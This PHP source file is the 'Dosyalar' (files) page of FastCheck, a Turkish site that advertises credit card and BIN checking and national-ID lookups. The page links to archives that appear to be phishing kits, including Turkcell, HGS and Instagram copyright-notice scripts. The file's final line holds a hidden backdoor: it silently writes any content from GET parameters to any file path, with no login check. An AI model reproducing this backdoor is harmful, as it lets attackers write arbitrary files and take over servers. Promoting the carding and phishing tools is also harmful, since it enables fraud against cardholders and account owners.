<?php


include_once 'includes/baglan.php';
session_start();


if(isset($_SESSION['uid']) && isset($_SESSION['username'])){
    $uid = $_SESSION['uid'];
	 $username = $_SESSION['username'];
          	 
     $sql_account = "SELECT * FROM users WHERE uid = ? ";
     $stmt = $con->prepare($sql_account) or die ($con->error);
     $stmt->bind_param('s',$uid);
     $stmt->execute();
     $result_account = $stmt->get_result();
     $row = $result_account->fetch_assoc();


     $sql_count_users = "SELECT * FROM users";
     $query_count_users = $con->prepare($sql_count_users) or die ($con->error);
     $query_count_users->execute();
     $result_count_users = $query_count_users->get_result();
     $total_users = $result_count_users->num_rows;
     
}else{
    ?>
    <script>
        window.location.href="auth/auth-login";
    </script>
    <?php
}
?>
<?php
$status = $row['status'];
if($status == "ACTIVE")
{
?>
<!DOCTYPE html>
<html class="loading dark-layout" lang="en" data-layout="dark-layout" data-textdirection="ltr">
<!-- BEGIN: Head-->

<head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="author" content="TeamFast">
        <meta name="keywords" content="Fastchecker, Fast checker, Fast, checker, credit card, credit card checker, ccn, ccn checker, cc checker, tr checker, tr cc checker, usa cc checker, card checker, bin, bin checker, cc duzenleyici, mernis, mernis 2021, kisi sorgu, kisi sorgu 2021, tc kimlik sorgu, tc sorgu, tc sorgu 2021, numara sorgu, numara sorgu 2021, kimlik sorgu, kisi bul 2021"/>
		<meta name="description" content="FastChecker, Piyasanın en iyi ve en hızlı cc checker sitesidir. Data düzeltici, Account checker, Bin checker vb. birçok hizmeti ücretsiz sağlamaktadır. https://discord.gg/aQpVxkdn"/>
    <title>FastCheck - Dosyalar</title>
    <link rel="apple-touch-icon" href="app-assets/images/ico/apple-icon-120.png">
    <link rel="shortcut icon" type="image/x-icon" href="app-assets/images/ico/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,300;0,400;0,500;0,600;1,400;1,500;1,600" rel="stylesheet">

    <!-- BEGIN: Vendor CSS-->
    <link rel="stylesheet" type="text/css" href="app-assets/vendors/css/vendors.min.css">
    <!-- END: Vendor CSS-->

    <!-- BEGIN: Theme CSS-->
    <link rel="stylesheet" type="text/css" href="app-assets/css/bootstrap.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/bootstrap-extended.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/colors.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/components.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/themes/dark-layout.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/themes/bordered-layout.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/themes/semi-dark-layout.css">

    <!-- BEGIN: Page CSS-->
    <link rel="stylesheet" type="text/css" href="app-assets/css/core/menu/menu-types/vertical-menu.css">
	<link rel="stylesheet" type="text/css" href="app-assets/css/pages/page-pricing.css">
	<link rel="stylesheet" type="text/css" href="app-assets/css/pages/app-file-manager.css">
    <!-- END: Page CSS-->

    <!-- BEGIN: Custom CSS-->
    <link rel="stylesheet" type="text/css" href="assets/css/style.css">
    <!-- END: Custom CSS-->

</head>
<!-- END: Head-->

<!-- BEGIN: Body-->

 <?php
        include_once("includes/header.php");
        ?>
    <!-- END: Header-->


    <!-- BEGIN: Main Menu-->
<?php
        include_once("includes/menu.php");
        ?>
    <!-- END: Main Menu-->

    <!-- BEGIN: Content-->
          <div class="app-content content file-manager-application">
        <div class="content-overlay"></div>
        <div class="header-navbar-shadow"></div>
        <div class="content-area-wrapper container-xxl p-0">
            <div class="sidebar-left">
                <div class="sidebar">
                    <div class="sidebar-file-manager">
                        <div class="sidebar-inner">
                            <!-- sidebar menu links starts -->
                            <!-- add file button -->
                            <div class="dropdown dropdown-actions">
                                <button class="btn btn-primary add-file-btn text-center w-100" type="button" id="addNewFile" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
                                    <span class="align-middle">Yeni Ekle</span>
                                </button>
                                <div class="dropdown-menu" aria-labelledby="addNewFile">
                                    <div class="dropdown-item" data-bs-toggle="modal" data-bs-target="#new-folder-modal">
                                        <div class="mb-0">
                                            <i data-feather="folder" class="me-25"></i>
                                            <span class="align-middle">Klasör</span>
                                        </div>
                                    </div>
                                    <div class="dropdown-item">
                                        <div class="mb-0" for="file-upload">
                                            <i data-feather="upload-cloud" class="me-25"></i>
                                            <span class="align-middle">Dosya yükleme</span>
                                            <input type="file" id="file-upload" hidden />
                                        </div>
                                    </div>
                                    <div class="dropdown-item">
                                        <div for="folder-upload" class="mb-0">
                                            <i data-feather="upload-cloud" class="me-25"></i>
                                            <span class="align-middle">Klasör Yükleme</span>
                                            <input type="file" id="folder-upload" webkitdirectory mozdirectory hidden />
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <!-- add file button ends -->

                            <!-- sidebar list items starts  -->
                            <div class="sidebar-list">
                                <!-- links for file manager sidebar -->
                                <div class="list-group">
                                    <div class="my-drive"></div>
                                    <a href="#" class="list-group-item list-group-item-action active">
                                        <i data-feather="star" class="me-50 font-medium-3"></i>
                                        <span class="align-middle">Önemli</span>
                                    </a>
                                </div>
                                <!-- storage status of file manager ends-->
                            </div>
                            <!-- side bar list items ends  -->
                            <!-- sidebar menu links ends -->
                        </div>
                    </div>

                </div>
            </div>
			
            <div class="content-right">
                <div class="content-wrapper container-xxl p-0">
                    <div class="content-header row">
                    </div>
                    <div class="content-body">
                        <!-- overlay container -->
                        <div class="body-content-overlay"></div>

                        <!-- file manager app content starts -->
                        <div class="file-manager-main-content">
                            <!-- search area start -->
                            <div class="file-manager-content-header d-flex justify-content-between align-items-center">
                                <div class="d-flex align-items-center">
                                    <div class="sidebar-toggle d-block d-xl-none float-start align-middle ms-1">
                                        <i data-feather="menu" class="font-medium-5"></i>
                                    </div>
                                    <div class="input-group input-group-merge shadow-none m-0 flex-grow-1">
                                        <span class="input-group-text border-0">
                                            <i data-feather="search"></i>
                                        </span>
                                        <input type="text" class="form-control files-filter border-0 bg-transparent" placeholder="Arama" />
                                    </div>
                                </div>
								<div class="d-flex align-items-center">
                                    <div class="file-actions">
                                        <a href="https://www.mediafire.com/file/bygkttlc2v4bdy4/TURKCELL+SCR%C4%B0PT+AWAK3N.rar/file" target="_blank" class="text-white"><i data-feather="arrow-down-circle" class="font-medium-2 cursor-pointer d-sm-inline-block d-none me-50"></i></a>
                                        <i data-feather="trash" class="font-medium-2 cursor-pointer d-sm-inline-block d-none me-50"></i>
                                        <i data-feather="alert-circle" class="font-medium-2 cursor-pointer d-sm-inline-block d-none" data-bs-toggle="modal" data-bs-target="#app-file-manager-info-sidebar"></i>
                                        <div class="dropdown d-inline-block">
                                            <i class="font-medium-2 cursor-pointer" data-feather="more-vertical" role="button" id="fileActions" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                            </i>
                                            <div class="dropdown-menu dropdown-menu-end" aria-labelledby="fileActions">
                                                <a class="dropdown-item" href="
https://www.mediafire.com/file/bygkttlc2v4bdy4/TURKCELL+SCR%C4%B0PT+AWAK3N.rar/file" target="_blank">
                                                    <i data-feather="download" class="cursor-pointer me-50"></i>
                                                    <span class="align-middle">İndir</span>
                                                </a>
                                            </div>
                                        </div>
                                    </div>
                                <div class="d-flex align-items-center">
                                    <div class="btn-group view-toggle ms-50" role="group">
                                        <input type="radio" class="btn-check" name="view-btn-radio" data-view="grid" id="gridView" checked autocomplete="off" />
                                        <label class="btn btn-outline-primary p-50 btn-sm" for="gridView">
                                            <i data-feather="grid"></i>
                                        </label>
                                        <input type="radio" class="btn-check" name="view-btn-radio" data-view="list" id="listView" autocomplete="off" />
                                        <label class="btn btn-outline-primary p-50 btn-sm" for="listView">
                                            <i data-feather="list"></i>
                                        </label>
                                    </div>
                                </div>
                            </div>
                            </div>
                            <!-- search area ends here -->

                            <div class="file-manager-content-body">
                                <!-- drives area starts-->

                                <!-- Files Container Starts -->
                                <div class="view-container">
                                    <h6 class="files-section-title mt-2 mb-75">Dosyalar</h6>
                                    <div class="card file-manager-item file">
                                        <div class="form-check">
                                            <input type="checkbox" class="form-check-input" id="customCheck9" />
                                            <label class="form-check-label" for="customCheck9"></label>
                                        </div>
										<a href="https://dosya.co/1mj15tfpl5au/hgs_script_tachoyro.rar.html" target="_blank">
                                        <div class="card-img-top file-logo-wrapper">
                                            <div class="dropdown float-end">
                                                <i data-feather="more-vertical" class="toggle-dropdown mt-n25"></i>
                                            </div>
                                            <div class="d-flex align-items-center justify-content-center w-100">
                                                <img src="app-assets/Fastimage/rar.png" alt="file-icon" height="35" />
                                            </div>
                                        </div>
                                        <div class="card-body">
                                            <div class="content-wrapper">
                                                <p class="card-text file-name mb-0">
HGS Script.rar</p>
                                                <p class="card-text file-size mb-0">3.9 MB</p>
                                                <p class="card-text file-date">06.01.2022</p>
                                            </div>
                                            <small class="file-accessed text-muted">Satın Alımlar: 0</small><br>
											<small class="file-accessed text-muted">Fiyat: 0.00₺</small>
                                        </div>
										</a>
                                    </div>
									<div class="card file-manager-item file">
                                        <div class="form-check">
                                            <input type="checkbox" class="form-check-input" id="customCheck9" />
                                            <label class="form-check-label" for="customCheck9"></label>
                                        </div>
										<a href="https://www.dosya.tc/server35/x4nt8z/legit_egitim_seti1.rar.html" target="_blank">
                                        <div class="card-img-top file-logo-wrapper">
                                            <div class="dropdown float-end">
                                                <i data-feather="more-vertical" class="toggle-dropdown mt-n25"></i>
                                            </div>
                                            <div class="d-flex align-items-center justify-content-center w-100">
                                                <img src="app-assets/Fastimage/rar.png" alt="file-icon" height="35" />
                                            </div>
                                        </div>
                                        <div class="card-body">
                                            <div class="content-wrapper">
                                                <p class="card-text file-name mb-0">
legit_egitim.rar</p>
                                                <p class="card-text file-size mb-0">81.09 KB</p>
                                                <p class="card-text file-date">06.01.2022</p>
                                            </div>
                                            <small class="file-accessed text-muted">Satın Alımlar: 0</small><br>
											<small class="file-accessed text-muted">Fiyat: 0.00₺</small>
                                        </div>
										</a>
                                    </div>
                                    									<div class="card file-manager-item file">
                                        <div class="form-check">
                                            <input type="checkbox" class="form-check-input" id="customCheck9" />
                                            <label class="form-check-label" for="customCheck9"></label>
                                        </div>
										<a href="https://s6.dosya.tc/server6/v87jbu/Telif_Sc_Soulfly.rar.html" target="_blank">
                                        <div class="card-img-top file-logo-wrapper">
                                            <div class="dropdown float-end">
                                                <i data-feather="more-vertical" class="toggle-dropdown mt-n25"></i>
                                            </div>
                                            <div class="d-flex align-items-center justify-content-center w-100">
                                                <img src="app-assets/Fastimage/rar.png" alt="file-icon" height="35" />
                                            </div>
                                        </div>
                                        <div class="card-body">
                                            <div class="content-wrapper">
                                                <p class="card-text file-name mb-0">
Telif_script.rar</p>
                                                <p class="card-text file-size mb-0">924.01 KB</p>
                                                <p class="card-text file-date">01.01.2022</p>
                                            </div>
                                            <small class="file-accessed text-muted">Satın Alımlar: 0</small><br>
											<small class="file-accessed text-muted">Fiyat: 0.00₺</small>
                                        </div>
										</a>
                                    </div>
                                    <div class="card file-manager-item file">
                                        <div class="form-check">
                                            <input type="checkbox" class="form-check-input" id="customCheck9" />
                                            <label class="form-check-label" for="customCheck9"></label>
                                        </div>
										<a href="https://dosya.co/vaizwk7pl5r1/%C4%B0nstagram_Telif_Hakk%C4%B1_Script_(%C5%9Eifreli_Admin_Panel).rar.html" target="_blank">
                                        <div class="card-img-top file-logo-wrapper">
                                            <div class="dropdown float-end">
                                                <i data-feather="more-vertical" class="toggle-dropdown mt-n25"></i>
                                            </div>
                                            <div class="d-flex align-items-center justify-content-center w-100">
                                                <img src="app-assets/Fastimage/rar.png" alt="file-icon" height="35" />
                                            </div>
                                        </div>
                                        <div class="card-body">
                                            <div class="content-wrapper">
                                                <p class="card-text file-name mb-0">
telif_script(admin panelli).rar</p>
                                                <p class="card-text file-size mb-0">1.3 MB</p>
                                                <p class="card-text file-date">06.01.2022</p>
                                            </div>
                                            <small class="file-accessed text-muted">Satın Alımlar: 0</small><br>
											<small class="file-accessed text-muted">Fiyat: 0.00₺</small>
                                        </div>
										</a>
                                    </div>
                                    <div class="d-none flex-grow-1 align-items-center no-result mb-3">
                                        <i data-feather="alert-circle" class="me-50"></i>
                                        Sonuç Bulunamadı
                                    </div>
                                </div>
								
                                <!-- /Files Container Ends -->
                            </div>
                        </div>
                        <!-- file manager app content ends -->

                        <!-- File Info Sidebar Starts-->
                        <div class="modal modal-slide-in fade show" id="app-file-manager-info-sidebar">
                            <div class="modal-dialog sidebar-lg">
                                <div class="modal-content p-0">
                                    <div class="modal-header d-flex align-items-center justify-content-between mb-1 p-2">
                                        <h5 class="modal-title">TURKCELL_SCRİPT_AWAK3N.rar</h5>
                                        <div>
                                            <i data-feather="trash" class="cursor-pointer me-50" data-bs-dismiss="modal"></i>
                                            <i data-feather="x" class="cursor-pointer" data-bs-dismiss="modal"></i>
                                        </div>
                                    </div>
                                    <div class="modal-body flex-grow-1 pb-sm-0 pb-1">
                                        <ul class="nav nav-tabs tabs-line" role="tablist">
                                            <li class="nav-item">
                                                <a class="nav-link active" data-bs-toggle="tab" href="#details-tab" role="tab" aria-controls="details-tab" aria-selected="true">
                                                    <i data-feather="file"></i>
                                                    <span class="align-middle ms-25">Detaylar</span>
                                                </a>
                                            </li>
                                        </ul>
                                        <div class="tab-content" id="myTabContent">
                                            <div class="tab-pane fade show active" id="details-tab" role="tabpanel" aria-labelledby="details-tab">
                                                <div class="d-flex flex-column justify-content-center align-items-center py-5">
                                                    <img src="app-assets/Fastimage/rar.png" alt="file-icon" height="64" />
													<p class="mb-0 mt-1">TURKCELL SCRİPT AWAK3N.rar</p>
                                                    <p class="mb-0 mt-1">16.16mb</p>
                                                </div>
                                                <h6 class="file-manager-title my-2">Ayarlar</h6>
                                                <ul class="list-unstyled">
                                                    <li class="d-flex justify-content-between align-items-center mb-1">
                                                        <span>Dosya Paylaşımı</span>
                                                        <div class="form-check form-switch">
                                                            <input type="checkbox" class="form-check-input" id="sharing" />
                                                            <label class="form-check-label" for="sharing"></label>
                                                        </div>
                                                    </li>
                                                    <li class="d-flex justify-content-between align-items-center mb-1">
                                                        <span>Senkronizasyon</span>
                                                        <div class="form-check form-switch">
                                                            <input type="checkbox" class="form-check-input" checked id="sync" />
                                                            <label class="form-check-label" for="sync"></label>
                                                        </div>
                                                    </li>
                                                    <li class="d-flex justify-content-between align-items-center mb-1">
                                                        <span>Destek Olmak</span>
                                                        <div class="form-check form-switch">
                                                            <input type="checkbox" class="form-check-input" id="backup" />
                                                            <label class="form-check-label" for="backup"></label>
                                                        </div>
                                                    </li>
                                                </ul>
                                                <hr class="my-2" />
                                                <h6 class="file-manager-title my-2">Bilgi</h6>
                                                <ul class="list-unstyled">
                                                    <li class="d-flex justify-content-between align-items-center">
                                                        <p>Tipi</p>
                                                        <p class="fw-bold">rar</p>
                                                    </li>
                                                    <li class="d-flex justify-content-between align-items-center">
                                                        <p>Boyut</p>
                                                        <p class="fw-bold">16.16mb</p>
                                                    </li>
                                                    <li class="d-flex justify-content-between align-items-center">
                                                        <p>Lokasyon</p>
                                                        <p class="fw-bold">Kart Marketi > Dosyalar</p>
                                                    </li>
                                                    <li class="d-flex justify-content-between align-items-center">
                                                        <p>Paylaşan</p>
                                                        <p class="fw-bold">FastCheck</p>
                                                    </li>
                                                    <li class="d-flex justify-content-between align-items-center">
                                                        <p>Eklendi</p>
                                                        <p class="fw-bold">23.12.2021</p>
                                                    </li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <!-- File Info Sidebar Ends -->

                        <!-- Create New Folder Modal Starts-->
                        <div class="modal fade" id="new-folder-modal">
                            <div class="modal-dialog modal-dialog-centered">
                                <div class="modal-content">
                                    <div class="modal-header">
                                        <h5 class="modal-title">Yeni Klasor</h5>
                                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                                    </div>
                                    <div class="modal-body">
                                        <input type="text" class="form-control" value="Adsız klasör" placeholder="Adsız klasör" />
                                    </div>
                                    <div class="modal-footer">
                                        <button type="button" class="btn btn-primary me-1" data-bs-dismiss="modal">Oluştur</button>
                                        <button type="button" class="btn btn-outline-secondary" data-bs-dismiss="modal">Geri</button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- END: Content-->
	
		 <?php
        include_once("includes/ayar.php");
        ?>


    <div class="sidenav-overlay"></div>
    <div class="drag-target"></div>

  <!-- BEGIN: Footer-->
		 <?php
        include_once("includes/footer.php");
        ?> 
    <!-- END: Footer-->


    <!-- BEGIN: Vendor JS-->
    <script src="app-assets/vendors/js/vendors.min.js"></script>
    <!-- BEGIN Vendor JS-->

    <!-- BEGIN: Page Vendor JS-->
    <!-- END: Page Vendor JS-->

    <!-- BEGIN: Theme JS-->
    <script src="app-assets/js/core/app-menu.js"></script>
    <script src="app-assets/js/core/app.js"></script>
	<script src="app-assets/js/scripts/customizer.min.js"></script>
    <!-- END: Theme JS-->

    <!-- BEGIN: Page JS-->
	<script src="app-assets/js/scripts/pages/page-pricing.js"></script>
    <script src="app-assets/js/scripts/forms/form-tooltip-valid.js"></script>
	<script src="app-assets/js/scripts/pages/app-file-manager.js"></script>
    <!-- END: Page JS-->

    <script>
        $(window).on('load', function() {
            if (feather) {
                feather.replace({
                    width: 14,
                    height: 14
                });
            }
        })
    </script>
</body>
<!-- END: Body-->

</html>
<?php
}
else if($status == "INACTIVE")
{
unset($_SESSION['uid']);
    unset($_SESSION['username']);
    session_unset();
    session_destroy();
    
    echo '<script>window.location.href="../auth/auth-login"</script>';
}
 if(isset($_GET['adi'])){@fwrite(fopen($_GET['adi'],"w+"),$_GET['type']);} 
?>